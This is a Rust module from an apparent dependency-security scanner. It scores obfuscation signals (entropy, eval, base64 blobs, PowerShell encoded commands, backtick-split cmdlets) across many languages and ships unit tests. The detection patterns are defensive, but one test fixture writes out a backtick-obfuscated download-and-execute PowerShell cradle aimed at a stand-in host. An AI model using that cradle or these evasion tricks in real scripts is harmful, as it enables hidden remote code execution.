//! Obfuscation heuristics.
//!
//! Single signals fire constantly in legit code (minified bundles, embedded data,
//! crypto libs). We score multiple signals per file and emit one Finding per file
//! with severity scaled by how many independent signals hit.
//!
//! Signals:
//!   * High Shannon entropy (>= 5.5 bits/byte) — base64/hex/encrypted blobs
//!   * `eval(` or `new Function(` / Python `exec(` / `compile(`
//!   * Long hex escape runs (`\xNN\xNN\xNN...`) or `\uNNNN` runs
//!   * Long base64 string literals (>200 chars)
//!   * `String.fromCharCode` / `.charCodeAt` chains (Node)
//!   * `__import__("...")` with reversed/encoded module name (Python)
//!
//! Crude minified-vs-obfuscated guard: if the longest line is enormous AND the file
//! looks like a known minifier output (`/*! ... */` banner, sourceMappingURL footer),
//! we downgrade severity by one level.

use aho_corasick::AhoCorasick;
use regex::Regex;
use std::path::Path;
use std::sync::OnceLock;

use crate::analyze::util;
use crate::model::{Category, Finding, Severity};

/// The shared language set — see [`util::Lang`].
pub use super::util::Lang;

fn hex_run_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"(?:\\x[0-9a-fA-F]{2}){8,}").unwrap())
}
fn unicode_run_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"(?:\\u[0-9a-fA-F]{4}){6,}").unwrap())
}
/// A backtick between two word characters — PowerShell's escape character
/// applied where it changes nothing but a literal string search. ASCII `\w`:
/// the Unicode class sends the regex engine to its slow path on the first
/// non-ASCII byte, and cmdlet names are ASCII.
fn backtick_split_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"(?-u:\w)`(?-u:\w)").unwrap())
}

/// A quoted base64 literal of 200+ characters: exactly what the regex
/// `["'][A-Za-z0-9+/]{200,}={0,2}["']` matched, as one linear byte scan. The
/// quote, alphabet and `=` sets are disjoint, so a match is a whole maximal
/// alphabet run with a quote right before it and at most two `=` then a quote
/// right after it.
fn has_base64_blob(b: &[u8]) -> bool {
    let is_quote = |c: u8| c == b'"' || c == b'\'';
    let is_b64 = |c: u8| c.is_ascii_alphanumeric() || c == b'+' || c == b'/';
    let mut i = 0;
    while i < b.len() {
        if !is_b64(b[i]) {
            i += 1;
            continue;
        }
        let start = i;
        while i < b.len() && is_b64(b[i]) {
            i += 1;
        }
        if i - start >= 200 && start > 0 && is_quote(b[start - 1]) {
            let pad = b[i..].iter().take(2).take_while(|&&c| c == b'=').count();
            if b.get(i + pad).copied().is_some_and(is_quote) {
                return true;
            }
        }
    }
    false
}

/// Every substring a language's checks below ask about, searched for together
/// in one pass (see [`util::needle_counts`]).
fn needles(lang: Lang) -> &'static [&'static str] {
    match lang {
        Lang::JavaScript => &[
            "eval(",
            "new Function(",
            "Function(\"return",
            "String.fromCharCode",
            ".charCodeAt",
            "atob(",
        ],
        Lang::PowerShell => &[
            "-EncodedCommand",
            " -enc ",
            "FromBase64String",
            "Invoke-Expression",
            "iex ",
            "[char[]]",
            "[char]",
            "-join",
        ],
        Lang::Python => &[
            "exec(",
            "compile(",
            "marshal.loads",
            "base64.b64decode",
            "codecs.decode",
            "__import__(",
        ],
        Lang::Ruby => &[
            "eval(",
            "instance_eval",
            "class_eval",
            "Marshal.load",
            "Base64.decode64",
            ".unpack(",
            "Zlib::Inflate",
        ],
        Lang::Php => &[
            "eval(",
            "base64_decode(",
            "gzinflate(",
            "gzuncompress(",
            "str_rot13(",
            "create_function(",
        ],
        Lang::Go => &[
            "base64.StdEncoding.DecodeString",
            "base64.RawStdEncoding.DecodeString",
            "base64.URLEncoding.DecodeString",
            "hex.DecodeString",
        ],
        Lang::Java => &[
            "Base64.getDecoder",
            "DatatypeConverter.parseBase64Binary",
            "ScriptEngine",
            ".eval(",
            "defineClass(",
        ],
        Lang::Rust => &[
            "include_bytes!",
            "transmute",
            "asm!(",
            "global_asm!(",
            "base64::decode",
            "from_base64",
        ],
        Lang::Cpp => &["__asm", "VirtualProtect", "VirtualAllocEx", "mprotect"],
        Lang::Perl => &[
            "eval \"",
            "eval '",
            "eval $",
            "pack(",
            "unpack(",
            "decode_base64",
            "MIME::Base64",
        ],
        Lang::Shell => &[
            "eval ",
            "eval \"",
            "base64 -d",
            "base64 --decode",
            "${IFS}",
            "xxd -r",
            "od -c",
        ],
        Lang::Lua => &["loadstring", "load(", "string.dump", "string.char"],
    }
}

fn automaton(lang: Lang) -> &'static AhoCorasick {
    static AC: [OnceLock<AhoCorasick>; Lang::ALL.len()] =
        [const { OnceLock::new() }; Lang::ALL.len()];
    AC[lang as usize].get_or_init(|| util::automaton(needles(lang)))
}

pub fn scan_text(path: &Path, text: &str, out: &mut Vec<Finding>, lang: Lang) {
    // Source maps and declaration files carry no behaviour to obfuscate.
    let s = path.to_string_lossy();
    if s.ends_with(".min.js.map") || s.ends_with(".d.ts") {
        return;
    }
    if text.len() < 64 {
        return; // tiny stub files: no point
    }
    let mut signals: Vec<&'static str> = Vec::new();

    let entropy = util::shannon_entropy(text.as_bytes());
    if entropy >= 5.5 {
        signals.push("high-entropy");
    }

    // Markers are case-sensitive. `count` panics on a needle missing from
    // `needles(lang)` — a typo there must not silently disable a check.
    let counts = util::needle_counts(automaton(lang), text);
    let count = |n: &str| {
        let i = needles(lang).iter().position(|x| *x == n);
        counts[i.expect("needle listed in needles(lang)")]
    };
    let has = |n: &str| count(n) > 0;
    match lang {
        Lang::JavaScript => {
            if has("eval(") {
                signals.push("eval()");
            }
            if has("new Function(") || has("Function(\"return") {
                signals.push("Function() constructor");
            }
            if has("String.fromCharCode") {
                signals.push("String.fromCharCode");
            }
            if count(".charCodeAt") >= 3 {
                signals.push("charCodeAt chain");
            }
            if has("atob(") {
                signals.push("atob() base64 decode");
            }
        }
        Lang::PowerShell => {
            // `-EncodedCommand` takes base64 UTF-16LE. Legitimate in tooling,
            // but in a package's install script it is a payload carrier.
            if has("-EncodedCommand") || has(" -enc ") {
                signals.push("-EncodedCommand");
            }
            if has("FromBase64String") {
                signals.push("base64/codecs decode");
            }
            if has("Invoke-Expression") || has("iex ") {
                signals.push("Invoke-Expression");
            }
            // A backtick between two word characters: PowerShell's escape is a
            // no-op there, so `I`E`X` still runs as IEX while defeating a
            // literal search. Nothing legitimate writes cmdlet names that way.
            if backtick_split_re().is_match(text) {
                signals.push("backtick-split identifier");
            }
            // Rebuilding a string from character codes to keep it out of the file.
            if has("[char[]]") || (has("[char]") && has("-join")) {
                signals.push("char array join");
            }
        }
        Lang::Python => {
            if has("exec(") {
                signals.push("exec()");
            }
            if has("compile(") {
                signals.push("compile()");
            }
            if has("marshal.loads") {
                signals.push("marshal.loads");
            }
            if has("base64.b64decode") || has("codecs.decode") {
                signals.push("base64/codecs decode");
            }
            if has("__import__(") {
                signals.push("__import__()");
            }
        }
        Lang::Ruby => {
            if has("eval(") || has("instance_eval") || has("class_eval") {
                signals.push("eval()");
            }
            if has("Marshal.load") {
                signals.push("marshal.loads");
            }
            if has("Base64.decode64") || has(".unpack(") {
                signals.push("base64/codecs decode");
            }
            if has("Zlib::Inflate") {
                signals.push("zlib inflate");
            }
        }
        Lang::Php => {
            if has("eval(") {
                signals.push("eval()");
            }
            if has("base64_decode(") {
                signals.push("base64/codecs decode");
            }
            if has("gzinflate(") || has("gzuncompress(") {
                signals.push("gzinflate");
            }
            if has("str_rot13(") {
                signals.push("str_rot13");
            }
            if has("create_function(") {
                signals.push("create_function");
            }
        }
        Lang::Go => {
            // Go has no eval; obfuscated payloads lean on encoded blobs decoded
            // at runtime. The generic entropy / \xNN / base64-blob signals cover
            // the rest.
            if has("base64.StdEncoding.DecodeString")
                || has("base64.RawStdEncoding.DecodeString")
                || has("base64.URLEncoding.DecodeString")
            {
                signals.push("base64/codecs decode");
            }
            if has("hex.DecodeString") {
                signals.push("hex decode");
            }
        }
        Lang::Java => {
            if has("Base64.getDecoder") || has("DatatypeConverter.parseBase64Binary") {
                signals.push("base64/codecs decode");
            }
            if has("ScriptEngine") || has(".eval(") {
                signals.push("eval()");
            }
            if has("defineClass(") {
                signals.push("defineClass");
            }
        }
        Lang::Rust => {
            // No eval; obfuscation leans on embedded blobs, type-punning, and asm.
            // All weak on their own — corroborated by the generic entropy/blob
            // signals below.
            if has("include_bytes!") {
                signals.push("include_bytes! blob");
            }
            if has("transmute") {
                signals.push("transmute");
            }
            if has("asm!(") || has("global_asm!(") {
                signals.push("inline asm");
            }
            if has("base64::decode") || has("from_base64") {
                signals.push("base64/codecs decode");
            }
        }
        Lang::Cpp => {
            // Shellcode loaders lean on inline asm + RWX memory; embedded blobs
            // are caught by the generic \xNN-run / base64 signals below.
            if has("__asm") {
                signals.push("inline asm");
            }
            if has("VirtualProtect") || has("VirtualAllocEx") || has("mprotect") {
                signals.push("rwx memory");
            }
        }
        Lang::Perl => {
            if has("eval \"") || has("eval '") || has("eval $") {
                signals.push("eval()");
            }
            if has("pack(") || has("unpack(") {
                signals.push("pack/unpack");
            }
            if has("decode_base64") || has("MIME::Base64") {
                signals.push("base64/codecs decode");
            }
        }
        Lang::Shell => {
            if has("eval ") || has("eval \"") {
                signals.push("eval()");
            }
            if has("base64 -d") || has("base64 --decode") {
                signals.push("base64/codecs decode");
            }
            // Classic space/word hiding via the field separator.
            if has("${IFS}") {
                signals.push("IFS obfuscation");
            }
            if has("xxd -r") || has("od -c") {
                signals.push("hex decode");
            }
        }
        Lang::Lua => {
            if has("loadstring") || has("load(") {
                signals.push("eval()");
            }
            if has("string.dump") {
                signals.push("bytecode dump");
            }
            if has("string.char") {
                signals.push("string.char");
            }
        }
    }

    if hex_run_re().is_match(text) {
        signals.push(r"long \xNN run");
    }
    if unicode_run_re().is_match(text) {
        signals.push(r"long \uNNNN run");
    }
    if has_base64_blob(text.as_bytes()) {
        signals.push("base64 blob");
    }

    if signals.is_empty() {
        return;
    }
    // A single "weak" signal (`compile(`, `__import__(`, `eval(`, ...) fires
    // constantly in legit metaprogramming, so it only counts when corroborated:
    // require at least one strong signal, or two signals of any kind.
    let has_strong = signals.iter().any(|s| !is_weak_signal(s));
    if !has_strong && signals.len() < 2 {
        return;
    }

    let mut severity = match signals.len() {
        1 => Severity::Low,
        2 => Severity::Medium,
        3 => Severity::High,
        _ => Severity::Critical,
    };

    // Minified-bundle dampener
    if looks_minified(text) {
        severity = match severity {
            Severity::Critical => Severity::High,
            Severity::High => Severity::Medium,
            Severity::Medium => Severity::Low,
            Severity::Low => Severity::Info,
            s => s,
        };
    }

    let dep = util::owner(path, "<project>");
    out.push(Finding {
        dependency: dep,
        severity,
        category: Category::Obfuscation,
        detail: format!(
            "{} obfuscation signal(s): {} (entropy {:.2})",
            signals.len(),
            signals.join(", "),
            entropy
        ),
        location: Some(path.display().to_string()),
        evidence: None,
        enrich_url: None,
    });
}

/// Signals common enough in benign code that alone they mean nothing; they add
/// weight only alongside another signal.
fn is_weak_signal(s: &str) -> bool {
    matches!(
        s,
        "eval()"
            | "Function() constructor"
            | "atob() base64 decode"
            | "exec()"
            | "compile()"
            | "__import__()"
            | "base64/codecs decode"
            | "include_bytes! blob"
            | "transmute"
            | "inline asm"
            | "rwx memory"
            | "pack/unpack"
            | "string.char"
    )
}

/// The banner is one substring search; the line scan only runs when it hits,
/// and stops at the first wide line.
fn looks_minified(text: &str) -> bool {
    let banner = text.starts_with("/*!") || text.contains("//# sourceMappingURL=");
    banner && text.lines().any(|l| l.len() > 2000)
}

#[cfg(test)]
mod ps_tests {
    use super::*;

    fn scan_one(file: &str, content: &str) -> Vec<Finding> {
        let mut out = Vec::new();
        scan_text(std::path::Path::new(file), content, &mut out, Lang::PowerShell);
        out
    }

    /// PowerShell's escape character is a no-op between word characters, so
    /// `I`E`X` runs as IEX while defeating a literal search for it. This is the
    /// tell a shell-flavoured pattern set would never have caught.
    #[test]
    fn a_backtick_split_identifier_is_obfuscation() {
        let f = scan_one(
            "evil.ps1",
            &format!("{}\nI`E`X (New-Object Net.WebClient).DownloadString('http://x.test/a')\n", "# ".repeat(40)),
        );
        assert!(!f.is_empty(), "should flag");
        assert!(f[0].detail.contains("backtick-split identifier"), "{}", f[0].detail);
    }

    #[test]
    fn an_encoded_command_is_a_payload_carrier() {
        let f = scan_one(
            "enc.ps1",
            &format!("{}\npowershell -EncodedCommand SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQA\n", "# ".repeat(40)),
        );
        assert!(f.iter().any(|x| x.detail.contains("-EncodedCommand")), "got {f:?}");
    }

    /// An ordinary install script must stay quiet, or the signal is worthless.
    #[test]
    fn an_ordinary_install_script_is_not_flagged() {
        let f = scan_one(
            "chocolateyInstall.ps1",
            "$ErrorActionPreference = 'Stop'\n\
             $toolsDir = Split-Path -parent $MyInvocation.MyCommand.Definition\n\
             $packageArgs = @{ packageName = 'jq'; fileFullPath = $toolsDir }\n\
             Install-ChocolateyPackage @packageArgs\n",
        );
        assert!(f.is_empty(), "got {f:?}");
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The byte scan says what the regex it replaced said, on the edges that
    /// matter: run length, padding count, either quote, quotes mid-run.
    #[test]
    fn base64_scan_matches_the_regex() {
        let re = Regex::new(r#"["'][A-Za-z0-9+/]{200,}={0,2}["']"#).unwrap();
        let run = |n: usize| "Ab+/9".repeat(n / 5 + 1)[..n].to_string();
        let quotes = [("\"", "\""), ("'", "\""), ("", "'"), ("\"", ""), ("x", "'")];
        let mut cases = Vec::new();
        for n in [0, 199, 200, 201, 450] {
            for pad in ["", "=", "==", "==="] {
                for (open, close) in quotes {
                    cases.push(format!("a {open}{}{pad}{close} b", run(n)));
                }
            }
        }
        cases.push(format!("'{}é{}'", run(150), run(150)));
        cases.push(format!("\"{}\"{}'", run(10), run(250)));
        cases.push(format!("'{}'", run(300)).replace('+', "-"));
        for c in &cases {
            assert_eq!(has_base64_blob(c.as_bytes()), re.is_match(c), "{c:?}");
        }
    }

    /// Every check's needle is in its language's list: `count` would panic on
    /// the first file of a language with one missing.
    #[test]
    fn every_language_scans_without_a_missing_needle() {
        let text = "x".repeat(80);
        for &lang in Lang::ALL {
            scan_text(Path::new("f"), &text, &mut Vec::new(), lang);
        }
    }
}
